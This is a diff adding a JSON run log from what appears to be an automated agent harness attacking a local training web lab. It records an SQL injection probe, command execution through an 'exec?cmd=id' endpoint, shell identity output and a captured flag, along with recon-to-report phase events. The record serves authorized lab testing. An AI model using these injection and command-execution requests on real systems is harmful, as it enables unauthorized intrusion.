+          "sha256": "25c1f5a95e970a0ca5bc9f680e35e3e0c42b293cb7ccdd3d6f79b80f577cfbb5"
+        }
+      },
+      {
+        "step": "sqli-negative",
+        "request": {
+          "method": "GET",
+          "url": "http://127.0.0.1:18089/search?q=%27+AND+1%3D0+--",
+          "headers": {
+            "X-Harness-Client": "harness-mvp"
+          }
+        },
+        "response": {
+          "status_code": 200,
+          "headers": {
+            "Server": "BaseHTTP/0.6 Python/3.12.13",
+            "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+            "Content-Type": "text/html; charset=utf-8",
+            "Content-Length": "76",
+            "X-Training-Lab": "harness-mvp-complex",
+            "X-Training-Lab-Version": "complex-web-v1",
+            "X-Lab-Node": "edge-gateway",
+            "X-Lab-Upstream": "app-api",
+            "X-Lab-Upstream-Status": "200",
+            "X-Lab-Upstream-Node": "app-api"
+          },
+          "body": "<html><title>Complex Web Lab</title><body>Search results (0): </body></html>",
+          "sha256": "686cf59fbf4ec0463a91c7455663d2ca51b1287bd5d457b92731860076c850ca"
+        }
+      },
+      {
+        "step": "shell-whoami",
+        "request": {
+          "method": "GET",
+          "url": "http://127.0.0.1:18089/internal/whoami",
+          "headers": {
+            "X-Harness-Client": "harness-mvp",
+            "X-Lab-Session": "lab-session-v1"
+          }
+        },
+        "response": {
+          "status_code": 200,
+          "headers": {
+            "Server": "BaseHTTP/0.6 Python/3.12.13",
+            "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+            "Content-Type": "text/html; charset=utf-8",
+            "Content-Length": "151",
+            "X-Training-Lab": "harness-mvp-complex",
+            "X-Training-Lab-Version": "complex-web-v1",
+            "X-Lab-Node": "edge-gateway",
+            "X-Lab-Upstream": "internal-admin",
+            "X-Lab-Upstream-Status": "200",
+            "X-Lab-Upstream-Node": "internal-admin"
+          },
+          "body": "<html><title>Complex Web Lab</title><body>uid=65532(labuser) gid=65532(labuser) groups=65532(labuser) tty=lab-console host=internal-admin</body></html>",
+          "sha256": "ae823ed3e5e9439a18311431b9fe871e899c74fff7e33f6ce130906a52cf8f3f"
+        }
+      },
+      {
+        "step": "shell-exec-id",
+        "request": {
+          "method": "GET",
+          "url": "http://127.0.0.1:18089/internal/exec?cmd=id",
+          "headers": {
+            "X-Harness-Client": "harness-mvp",
+            "X-Lab-Session": "lab-session-v1"
+          }
+        },
+        "response": {
+          "status_code": 200,
+          "headers": {
+            "Server": "BaseHTTP/0.6 Python/3.12.13",
+            "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+            "Content-Type": "text/html; charset=utf-8",
+            "Content-Length": "151",
+            "X-Training-Lab": "harness-mvp-complex",
+            "X-Training-Lab-Version": "complex-web-v1",
+            "X-Lab-Node": "edge-gateway",
+            "X-Lab-Upstream": "internal-admin",
+            "X-Lab-Upstream-Status": "200",
+            "X-Lab-Upstream-Node": "internal-admin"
+          },
+          "body": "<html><title>Complex Web Lab</title><body>uid=65532(labuser) gid=65532(labuser) groups=65532(labuser) tty=lab-console host=internal-admin</body></html>",
+          "sha256": "ae823ed3e5e9439a18311431b9fe871e899c74fff7e33f6ce130906a52cf8f3f"
+        }
+      },
+      {
+        "step": "read-flag",
+        "request": {
+          "method": "GET",
+          "url": "http://127.0.0.1:18089/internal/flag",
+          "headers": {
+            "X-Harness-Client": "harness-mvp",
+            "X-Lab-Session": "lab-session-v1"
+          }
+        },
+        "response": {
+          "status_code": 200,
+          "headers": {
+            "Server": "BaseHTTP/0.6 Python/3.12.13",
+            "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+            "Content-Type": "text/html; charset=utf-8",
+            "Content-Length": "95",
+            "X-Training-Lab": "harness-mvp-complex",
+            "X-Training-Lab-Version": "complex-web-v1",
+            "X-Lab-Node": "edge-gateway",
+            "X-Lab-Upstream": "internal-admin",
+            "X-Lab-Upstream-Status": "200",
+            "X-Lab-Upstream-Node": "internal-admin"
+          },
+          "body": "<html><title>Complex Web Lab</title><body>FLAG{harness-complex-web-authorized-v1}</body></html>",
+          "sha256": "bffe677372c43fd99447ed113c7cccc831a786b81f065cbde8fd6051c01395e2"
+        }
+      }
+    ],
+    "test_evidence": {
+      "chain": [
+        "discover",
+        "verify",
+        "constrained-shell-identity",
+        "read-flag"
+      ],
+      "classification": "local-real-complex-web",
+      "shell_obtained": true,
+      "shell_identity": "uid=65532(labuser)",
+      "flag": "FLAG{harness-complex-web-authorized-v1}",
+      "flag_match": true,
+      "flag_sha256": "2ef099f042467dd8b0569655972062e41c15030e00c19ed265086f9b166cc74e",
+      "session_token_seen": true
+    }
+  },
+  "events": [
+    {
+      "timestamp": "2026-09-10T05:36:13+00:00",
+      "phase": "plan",
+      "message": "created bounded agent plan",
+      "details": {
+        "steps": [
+          "recon",
+          "vuln",
+          "exploit",
+          "report"
+        ]
+      }
+    },
+    {
+      "timestamp": "2026-09-10T05:36:13+00:00",
+      "phase": "recon",
+      "message": "agent started",
+      "details": {
+        "attempt": 1
+      }
+    },
+    {
+      "timestamp": "2026-09-10T05:36:13+00:00",
+      "phase": "recon",
+      "message": "success",
+      "details": {
+        "summary": "probed 8 lab endpoints"
+      }
+    },
+    {
+      "timestamp": "2026-09-10T05:36:13+00:00",
+      "phase": "vuln",
+      "message": "agent started",
+      "details": {
+        "attempt": 1
+      }
+    },
+    {
+      "timestamp": "2026-09-10T05:36:13+00:00",
+      "phase": "vuln",
+      "message": "success",
+      "details": {
+        "summary": "identified 1 findings"
+      }
+    },
+    {
+      "timestamp": "2026-09-10T05:36:13+00:00",
+      "phase": "exploit",
+      "message": "agent started",
+      "details": {
+        "attempt": 1
+      }
+    },
+    {
+      "timestamp": "2026-09-10T05:36:13+00:00",
+      "phase": "exploit",
+      "message": "success",
+      "details": {
+        "summary": "validated verified for complex-web chain"
+      }
+    },
+    {
+      "timestamp": "2026-09-10T05:36:13+00:00",
+      "phase": "report",
+      "message": "agent started",
+      "details": {
+        "attempt": 1
+      }
+    },
+    {
+      "timestamp": "2026-09-10T05:36:13+00:00",
+      "phase": "report",
+      "message": "success",
+      "details": {
+        "summary": "assembled auditable report"
+      }
+    }
+  ],
+  "errors": []
+}
